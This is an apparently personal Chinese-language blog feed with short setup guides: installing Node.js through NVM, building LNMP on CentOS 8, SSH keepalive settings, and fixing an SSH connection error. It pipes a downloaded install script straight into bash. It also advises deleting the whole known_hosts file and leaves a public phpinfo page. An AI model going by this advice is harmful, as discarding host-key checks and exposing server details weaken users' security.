    <content type="html"><![CDATA[<p>Node.js 是一个跨平台的 JavaScript 运行环境，简单的说 Node.js 就是运行在服务端的 JavaScript。使用 Node.js，你可以构建扩展的网络应用。</p><p>NPM(Node Package Manager)是 Node.js 为了方便开发者使用和重用代码而开发的默认包管理器。它也是世界上用来发布开源 Node.js 包的最大软件仓库。</p><p>NVM (Node Version Manager) 是一个 bash 脚本，它允许你管理多个 Node.js 版本。通过 NVM，你可以安装或者卸载任何你想要使用或者测试的 Node.js 版本。</p><h2 id="NVM-的安装"><a href="#NVM-的安装" class="headerlink" title="NVM 的安装"></a>NVM 的安装</h2><p>在NVM的GitHub网站上复制安装命令，更新的话重新输一下命令即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o- https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/nvm-sh/</span>nvm<span class="regexp">/v0.37.1/i</span>nstall.sh | bash</span><br></pre></td></tr></table></figure><p>重新打开命令行即可使用nvm了</p><h2 id="Node-js-和-npm-的安装"><a href="#Node-js-和-npm-的安装" class="headerlink" title="Node.js 和 npm 的安装"></a>Node.js 和 npm 的安装</h2><p>运行以下命令安装最新的 Node.js 的 LTS 版本</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm install <span class="comment">--lts</span></span><br></pre></td></tr></table></figure><p>列出所有已经安装的 Node.js 版本</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nvm ls</span></span><br></pre></td></tr></table></figure><p>改变当前可用的版本号</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm <span class="keyword">use</span> [版本号]</span><br></pre></td></tr></table></figure><p>改变 Node.js 的默认版本</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm <span class="keyword">alias</span> <span class="keyword">default</span> [版本号]</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">CentOS8下安装Node.js和npm</summary>
    
    
    
    <category term="Linux" scheme="http://yunhenlxx.github.io/categories/Linux/"/>
    
    
    <category term="Linux" scheme="http://yunhenlxx.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>CentOS8下搭建LNMP</title>
    <link href="http://yunhenlxx.github.io/2021/03/24/CentOS8%E4%B8%8B%E6%90%AD%E5%BB%BALNMP/"/>
    <id>http://yunhenlxx.github.io/2021/03/24/CentOS8%E4%B8%8B%E6%90%AD%E5%BB%BALNMP/</id>
    <published>2021-03-24T07:36:35.000Z</published>
    <updated>2021-03-24T07:37:06.969Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装和配置-Nginx"><a href="#安装和配置-Nginx" class="headerlink" title="安装和配置 Nginx"></a>安装和配置 Nginx</h2><ol><li>安装 Nginx</li></ol><p>以安装 Nginx 1.18.0 为例，可通过 <a href="http://nginx.org/packages/centos/8/x86_64/RPMS/?spm=a2c4g.11186623.2.31.557423bfYPMd6u">Ngingx 官方安装包</a> 获取适用于 CentOS 8的更多版本。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dnf</span> -y install http://nginx.org/packages/centos/<span class="number">8</span>/x<span class="number">86</span>_<span class="number">64</span>/RPMS/nginx-<span class="number">1</span>.<span class="number">18</span>.<span class="number">0</span>-<span class="number">1</span>.el<span class="number">8</span>.ngx.x<span class="number">86</span>_<span class="number">64</span>.rpm</span><br></pre></td></tr></table></figure><ol start="2"><li>查看 Nginx 版本</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nginx -v</span></span><br></pre></td></tr></table></figure><ol start="3"><li>查看 Nginx 配置文件路径</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/etc/</span>nginx/nginx.conf</span><br></pre></td></tr></table></figure><p>include 配置项的 /etc/nginx/conf.d/*.conf 即为 Nginx 配置文件的默认路径</p><ol start="4"><li>在配置文件默认路径下进行备份</li></ol><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> /etc/nginx/<span class="keyword">conf</span>.d</span><br><span class="line"><span class="keyword">cp</span> default.<span class="keyword">conf</span> *.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure><ol start="5"><li>打开 *.conf 文件</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">vim</span> <span class="regexp">*.conf</span></span><br></pre></td></tr></table></figure><ol start="6"><li>编辑 default.conf 文件</li></ol><ul><li><p>在 location 的 index 项中添加 index.php</p></li><li><p>删除 location ~ .php$ 大括号前的 #，并修改以下配置项：</p></li><li><ul><li>修改 root 项为网站根目录，即 location 中的 root 项，本文以 /usr/share/nginx/html; 为例</li><li>修改 fastcgi_pass 项为 unix:/run/php-fpm/<a href="http://www.sock/">www.sock</a>;</li><li>将 fastcgi_param SCRIPT_FILENAME 后的 /scripts$fastcgi_script_name; 替换为 $document_root$fastcgi_script_name;</li></ul></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    root          <span class="regexp">/usr/</span>share<span class="regexp">/nginx/</span>html;</span><br><span class="line">    fastcgi_pass  unix:<span class="regexp">/run/</span>php-fpm/www.sock;</span><br><span class="line">    fastcgi_index index.php;</span><br><span class="line">    fastcgi_param SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">    include       fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="7"><li>启动Nginx并设置为开机自启动并查看状态</li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="keyword">start</span> nginx</span><br><span class="line">systemctl <span class="keyword">enable</span> nginx</span><br><span class="line">systemctl status nginx</span><br></pre></td></tr></table></figure><h2 id="安装和配置MySQL"><a href="#安装和配置MySQL" class="headerlink" title="安装和配置MySQL"></a>安装和配置MySQL</h2><ol><li>安装 MySQL</li></ol><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnf -y install <span class="meta">@mysql</span></span><br></pre></td></tr></table></figure><ol start="2"><li>查看 MySQL 版本</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mysql -V</span></span><br></pre></td></tr></table></figure><ol start="3"><li>启动 MySQL 并设置为开机自启动并查看状态</li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="keyword">start</span> mysqld</span><br><span class="line">systemctl <span class="keyword">enable</span> mysqld</span><br><span class="line">systemctl status mysqld</span><br></pre></td></tr></table></figure><ol start="4"><li>执行 MySQL 安全性操作并设置密码</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mysql_secure_installation</span></span><br></pre></td></tr></table></figure><p>按照以下步骤，执行对应操作：</p><ul><li><p>输入 y 并按 <strong>Enter</strong> 开始相关配置。</p></li><li><p>选择密码验证策略强度，建议选择高强度的密码验证策略。输入 2 并按 <strong>Enter</strong>。</p></li><li><ul><li>0：表示低。</li><li>1：表示中。</li><li>2：表示高。</li></ul></li><li><p>设置 MySQL 密码并按 <strong>Enter</strong> ，输入密码默认不显示。</p></li><li><p>再次输入密码并按 <strong>Enter</strong>，输入 y 确认设置该密码。</p></li><li><p>输入 y 并按 <strong>Enter</strong>，移除匿名用户。</p></li><li><p>设置是否禁止远程连接 MySQL：</p></li><li><ul><li>禁止远程连接：输入 y 并按 <strong>Enter</strong>。</li><li>允许远程连接：输入 n 并按 <strong>Enter</strong>。</li></ul></li><li><p>输入 y 并按 <strong>Enter</strong>，删除 test 库及对 test 库的访问权限。</p></li><li><p>输入 y 并按 <strong>Enter</strong>，重新加载授权表。</p></li></ul><h2 id="安装和配置PHP"><a href="#安装和配置PHP" class="headerlink" title="安装和配置PHP"></a>安装和配置PHP</h2><ol><li>添加并更新 epel 源</li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnf -y install epel-<span class="keyword">release</span></span><br><span class="line">dnf <span class="keyword">update</span> epel-<span class="keyword">release</span></span><br></pre></td></tr></table></figure><ol start="2"><li>删除缓存的无用软件包并更新软件源</li></ol><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnf clean <span class="keyword">all</span></span><br><span class="line">dnf makecache</span><br></pre></td></tr></table></figure><ol start="3"><li>安装 remi 源</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnf -y install https:<span class="regexp">//</span>rpms.remirepo.net<span class="regexp">/enterprise/</span>remi-release-<span class="number">8</span>.rpm</span><br></pre></td></tr></table></figure><ol start="4"><li>启动 PHP 7.4 模块</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dnf</span> module install php:remi-<span class="number">7</span>.<span class="number">4</span></span><br></pre></td></tr></table></figure><ol start="5"><li>安装所需 PHP 对应模块</li></ol><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnf install php php-curl php-dom php-exif php-file<span class="literal">inf</span>o php-fpm php-gd php-hash php-json php-mbstring php-mysqli php-openssl php-pcre php-<span class="keyword">xml</span> <span class="title">libsodium</span></span><br></pre></td></tr></table></figure><ol start="6"><li>查看 PHP 版本</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">php -v</span></span><br></pre></td></tr></table></figure><ol start="7"><li>打开 <a href="http://www.conf/">www.conf</a> 文件</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>php-fpm.d/www.conf</span><br></pre></td></tr></table></figure><ol start="8"><li>将 user = apache 及 group = apache 修改为 user = nginx 及 group = nginx</li><li>启动 PHP-FPM 并设置为开机自启动并查看状态</li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="keyword">start</span> php-fpm</span><br><span class="line">systemctl <span class="keyword">enable</span> php-fpm</span><br><span class="line">systemctl status php-fpm</span><br></pre></td></tr></table></figure><h2 id="验证环境配置"><a href="#验证环境配置" class="headerlink" title="验证环境配置"></a>验证环境配置</h2><p>/usr/share/nginx/html 为 Nginx 中已配置的网站根目录</p><ol><li>创建测试文件</li></ol><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">echo &quot;</span><span class="php"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><span class="xml">&quot; &gt;&gt; /usr/share/nginx/html/index.php</span></span><br></pre></td></tr></table></figure><ol start="2"><li>在本地浏览器中访问服务器公网IP，查看环境配置是否成功</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>云服务器实例的公网 IP/index.php</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">CentOS8下搭建LNMP</summary>
    
    
    
    <category term="Linux" scheme="http://yunhenlxx.github.io/categories/Linux/"/>
    
    
    <category term="Linux" scheme="http://yunhenlxx.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Mac下SSH闲时自动中断解决方法</title>
    <link href="http://yunhenlxx.github.io/2021/03/24/Mac%E4%B8%8BSSH%E9%97%B2%E6%97%B6%E8%87%AA%E5%8A%A8%E4%B8%AD%E6%96%AD%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <id>http://yunhenlxx.github.io/2021/03/24/Mac%E4%B8%8BSSH%E9%97%B2%E6%97%B6%E8%87%AA%E5%8A%A8%E4%B8%AD%E6%96%AD%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</id>
    <published>2021-03-24T07:25:56.000Z</published>
    <updated>2021-03-24T07:30:44.791Z</updated>
    
    <content type="html"><![CDATA[<p>使用Mac自带的终端SSH连接服务器的时候，只要隔一小段时间不操作的话连接就会自动中断.</p><p>解决方法：</p><ol><li>连接到服务器</li><li>编辑服务端配置文件</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>ssh/sshd_config</span><br></pre></td></tr></table></figure><ol start="3"><li>在最下面添加两行配置代码</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ClientAliveInterval</span> <span class="number">30</span></span><br><span class="line"><span class="attribute">ClientAliveCountMax</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><ol start="4"><li>编辑客户端配置文件</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>ssh/ssh_config</span><br></pre></td></tr></table></figure><ol start="5"><li>在Host * 下面添加两行配置代码</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ServerAliveInterval</span> <span class="number">30</span></span><br><span class="line"><span class="attribute">ServerAliveCountMax</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><ol start="6"><li>同步数据然后重启</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sync<span class="regexp">//</span> 将数据由内存同步到硬盘</span><br><span class="line">reboot<span class="regexp">//</span> 重启</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Mac下SSH闲时自动中断解决方法</summary>
    
    
    
    <category term="Mac" scheme="http://yunhenlxx.github.io/categories/Mac/"/>
    
    
    <category term="Mac" scheme="http://yunhenlxx.github.io/tags/Mac/"/>
    
  </entry>
  
  <entry>
    <title>Mac终端连接云服务器出错</title>
    <link href="http://yunhenlxx.github.io/2021/03/24/Mac%E7%BB%88%E7%AB%AF%E8%BF%9E%E6%8E%A5%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8error/"/>
    <id>http://yunhenlxx.github.io/2021/03/24/Mac%E7%BB%88%E7%AB%AF%E8%BF%9E%E6%8E%A5%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8error/</id>
    <published>2021-03-24T07:11:42.000Z</published>
    <updated>2021-03-24T07:31:05.695Z</updated>
    
    <content type="html"><![CDATA[<p>删除 <code>~/.ssh/known_hosts</code> 即可重新连接成功</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;删除 &lt;code&gt;~/.ssh/known_hosts&lt;/code&gt; 即可重新连接成功&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Mac" scheme="http://yunhenlxx.github.io/categories/Mac/"/>
    
    
    <category term="Mac" scheme="http://yunhenlxx.github.io/tags/Mac/"/>
    
  </entry>
  
</feed>
